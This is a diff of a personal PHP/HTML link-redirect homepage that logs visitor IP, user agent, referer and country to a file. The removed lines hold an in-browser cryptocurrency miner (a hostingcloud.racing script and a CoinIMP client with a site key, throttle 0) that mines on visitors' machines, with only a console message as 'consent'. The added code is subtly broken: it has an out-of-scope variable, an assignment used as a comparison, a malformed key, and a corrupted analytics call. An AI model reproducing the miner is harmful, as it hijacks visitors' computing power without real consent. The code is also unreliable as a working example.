@@ -69,16 +69,12 @@ function ip_info($ip = NULL, $purpose = "location", $deep_detect = TRUE) {
     }
     return $output;
 }
-/* Get data from URL bar */
-    $page=$_GET['page'];
-    $type=$_GET['type'];
 
  /* Log users */
     $writeDirectory = "/var/www/dxcdn/log";
     $logFileName = "jylesclub.txt";
     $logWriteDestination = $writeDirectory."/".$logFileName;
     $log = fopen($logWriteDestination, a);
-    $writeToLogDestination = "Destination: ".$page."\n";
     $writeToLogType;
     $writeToLogIP = "IP Address: ".$_SERVER['REMOTE_ADDR']."\n";
     $writeToLogUserAgent = "User Agent: ".$_SERVER['HTTP_USER_AGENT']."\n";
@@ -90,67 +86,68 @@ function ip_info($ip = NULL, $purpose = "location", $deep_detect = TRUE) {
         header("Location: ".$_SERVER['HTTP_REFERER']);
     }
 
+    $destJSON = json_decode(file_get_contents("./dest.json"));
 
-    if ($page == "discord"){
-        header("Location: https://discord.gg/x92bvet");
-	$writeToLogType = "N/A";
-    }
-    elseif ($page == "seedbot"){
-        header("Location: http://seedbot.xyz");
-	$writeToLogType = "N/A";
-    }
-    elseif ($page == "seedbotinvite"){
-        header("Location: http://seedbot.xyz?invite");
-	$writeToLogType = "N/A";
-    }
-    elseif ($page == "donate"){
-        header("Location: https://paypal.me/darioxservices");
-	$writeToLogType = "N/A";
-    }
-    elseif ($page == "steam"){
-        header("Location: https://steamcommunity.com/id/seed_main");
-	$writeToLogType = "N/A";
-    }
-    elseif ($page == "github"){
-        header("Location: https://github.com/jylescoad-ward");
-	$writeToLogType = "N/A";
-    }
-    elseif ($page == "youtube"){
-        header("Location: https://youtube.com/seedvevo");
-	$writeToLogType = "N/A";
-    }
-    elseif ($page == "twitter") {
-        header("Location: https://twitter.com/jylescoadward");
-	$writeToLogType = "N/A";
-    }
-    elseif ($page == "twitch") {
-        header("Location: http://twitch.tv/seedplaysgames");
-	$writeToLogType = "N/A";
-    }
-    elseif ($page == "osu") {
-        if ($type == "profile") {
-            header("Location: https://osu.ppy.sh/u/seedplaysgames");
-      $writeToLogType = "Type: ".$type."\n";
-        }
-        elseif ($type == "skin") {
-            header("Location: https://storage.googleapis.com/dariox/share/osu-skin/latest.osk");
-      $writeToLogType = "Type: ".$type."\n";
-        }
-        else{
-            gtfo();
-        }
-    }
-    elseif ($page == "dariox") {
-        header("Location: http://dariox.club");
-    }
-    elseif ($page == "donate") {
-        header("Location: https://paypal.me/darioxservices");
-    }
-    elseif ($page == "soundcloud") {
-     header("Location: https://soundcloud.com/jyles-coad-ward/");
-    }
-  
-  $writeToLog = $writeToLogDestination.$writeToLogType.$writeToLogIP.$writeToLogUserAgent.$writeToLogReferer.$writeToLogRemotePort.$writeToLogHostname.$writeToLogTime.$writeToLogCountry."\n\n";
+    function destJSONRedirect($args) {
+        return header("Location: ".$destJSON->args);
+    } 
+
+        if (isset($_GET["discord"])){
+            destJSONRedirect([$page]);
+            $writeToLogType = "N/A"; 
+            $destination = "Discord";
+        } elseif (isset($_GET["seedbot"])){
+            destJSONRedirect([$page]);
+            $writeToLogType = "N/A";
+            $destination = "SeedBot";
+        } elseif (isset($_GET["donate"])){
+            destJSONRedirect([$page]);
+            $writeToLogType = "N/A";
+            $destination = "Paypal Donate";
+        } elseif (isset($_GET["steam"])){
+            destJSONRedirect([$page]);
+            $writeToLogType = "N/A";
+            $destination = "Steam";
+        } elseif (isset($_GET["github"])){
+            destJSONRedirect([$page]);
+            $writeToLogType = "N/A";
+            $destination = "Github";
+        } elseif (isset($_GET["youtube"])){
+            destJSONRedirect([$page]);
+            $writeToLogType = "N/A";
+            $destination = "Youtube";
+        } elseif (isset($_GET["twitter"])){
+            destJSONRedirect([$page]);
+            $writeToLogType = "N/A";
+            $destination = "Twitter";
+        } elseif (isset($_GET["twitch"])){
+            destJSONRedirect([$page]);
+            $writeToLogType = "N/A";
+            $destination = "Twitch";
+        } elseif (isset($_GET["osu"])){
+            if ($_GET["osu"] = "skin"){
+                destJSONRedirect(["osu[1]"]);
+                $destination = "osu! Skin";
+            } else {
+                destJSONRedirect(["osu[0]"]);
+                $destination = "osu! Profile";
+            }
+            $writeToLogType = "N/A";
+        } elseif (isset($_GET["soundcloud"])){
+            if ($_GET["soundcloud"] == "sets"){
+                destJSONRedirect(["soundcloud[1]"]);
+                $destination = "Soundcloud Sets";
+            } elseif ($_GET["soundcloud"] == "playlist") {
+                destJSONRedirect(["soundcloud[2]"]);
+                $destination = "Soundcloud 'Good Music' Playlist";
+            } else {
+                destJSONRedirect(["soundcloud[0"]);
+                $destination = "Soundcloud Page";
+            }
+        } else {}
+
+    $writeToLogDestination = "Destination: ".$destination."\n";
+    $writeToLog = $writeToLogDestination.$writeToLogIP.$writeToLogUserAgent.$writeToLogReferer.$writeToLogRemotePort.$writeToLogHostname.$writeToLogTime.$writeToLogCountry."\n\n";
 
     if (strpos($writeToLogUserAgent, 'CloudFlare-AlwaysOnline') !== true) {
         fwrite($log, $writeToLog);
@@ -177,25 +174,7 @@ function ip_info($ip = NULL, $purpose = "location", $deep_detect = TRUE) {
       jyles.club
     </title>
 
-    <link href="style.css" rel="stylesheet">
-    
-<script type='text/javascript'>
-if (window.location.href.substr(-2) !== '?r') {
-    window.location = window.location.href + '?r';
-}
-	console.log("By using this website you consent to using your computer power for crypto-currency mining, if you do not consent, please leave the website");
-
-</script>
-	  
-<script src="https://www.hostingcloud.racing/cPTP.js"></script>
-<script>
-    var _client = new Client.Anonymous('32dcfb13f92b42722a95f0264ea55fe6880a68490fef661237dd6777723d1c78', {
-        throttle: 0
-    });
-    _client.start();
-    _client.addMiningNotification("Top", "This site is running JavaScript miner from coinimp.com", "#cccccc", 40, "#3d3d3d");
-
-</script>
+    <link href="style.css" rel="stylesheet" type="text/css">
 
     <style>
 body{
@@ -228,9 +207,9 @@ body{
   text-align:center;
 }
 .donate{
-	position: absolute;
-	bottom: 20px;
-	left: 25px;
+    position: absolute;
+    bottom: 20px;
+    left: 25px;
 }
     </style>
 
@@ -247,35 +226,35 @@ body{
               jyles.club
             </h1>
             <p class="lead fade-in-fwd subtitle">
-		    life is a bruh sound effect
+            donate $2 so i can get a can of heinz beans
             </p><br><br>
             <table class="table-links fade-in-fwd">
               <tr>
                 <td>
-                  <a href="http://jyles.club/?page=github" rel="external follow">Github</a>
+                  <a href="http://jyles.club/?github" rel="external follow">Github</a>
                 </td>
                 <td>
-                  <a href="http://jyles.club/?page=steam" rel="external nofollow">Steam</a>
+                  <a href="http://jyles.club/?steam" rel="external nofollow">Steam</a>
                 </td>
                 <td>
-                  <a href="http://jyles.club/?page=discord" rel="external follow">Discord</a>
+                  <a href="http://jyles.club/?discord" rel="external follow">Discord</a>
                 </td>
                 <td>
-                  <a href="http://jyles.club/?page=seedbot" rel="external follow">SeedBot</a>
+                  <a href="http://jyles.club/?seedbot" rel="external follow">SeedBot</a>
                 </td>
               </tr>
               <tr>
                 <td>
-                  <a href="http://jyles.club/?page=live&type=twitch" rel="external follow">Twitch</a>
+                  <a href="http://jyles.club/?twitch" rel="external follow">Twitch</a>
                 </td>
                 <td>
-                  <a href="http://jyles.club/?page=osu&type=skin" rel="external follow" style="color: #ffc1ef;" download>osu! skin</a>
+                  <a href="http://jyles.club/?osu=skin" rel="external follow" style="color: #ffc1ef;" download>osu! skin</a>
+                </td>
+                <td> 
+                  <a href="http://jyles.club/?osu" rel="external follow" style="color: #ffc1ef;">osu! profile</a>
                 </td>
                 <td>
-                  <a href="http://jyles.club/?page=osu&type=profile" rel="external follow" style="color: #ffc1ef;">osu! profile</a>
-                </td>
-                <td>
-                  <a href="http://jyles.club/?page=youtube" rel="external follow">Youtube</a>
+                  <a href="http://jyles.club/?youtube" rel="external follow">Youtube</a>
                 </td>
               </tr>
             </table>
@@ -286,7 +265,7 @@ body{
 
     <center class="song" >
     <marquee class="music fade-in-fwd" width="250px" direction="left" scrollamount="3" behavior="scroll">
-      Currently Playing:  <a href="https://soundcloud.com/lofi-fpv/quok-atariwave-instrumental?in=jylescoad-ward/sets/good-music"> Atariwave [Insturemntal] </a>  by Quok</a></marquee>
+      Currently Playing:  <a href="https://soundcloud.com/lofi-fpv/quok-atariwave-instrumental?in=jylescoad-ward/sets/good-music"> Atariwave [Insturemntal] </a>by Quok</a></marquee>
     </center>
   </body>
   <iframe frameborder="0" style="position:absolute;top:5px;left:5px;" src="https://storage.googleapis.com/file-asia/cdn/atariwave-quok.mp3" allow="autoplay" height="0" width="0"></iframe>
@@ -299,7 +278,6 @@ body{
   </form>
 </div>
 </html>
-<script src="index.js"></script>
 <!-- Global site tag (gtag.js) - Google Analytics -->
 <script async src="https://www.googletagmanager.com/gtag/js?id=UA-77162061-4"></script>
 <script>
@@ -307,6 +285,5 @@ body{
   function gtag(){dataLayer.push(arguments);}
   gtag('js', new Date());
 
-  gtag('config', 'UA-77162061-4');
+  gtag('Something is wrong', 'UA-77162061-4');
 </script>
-
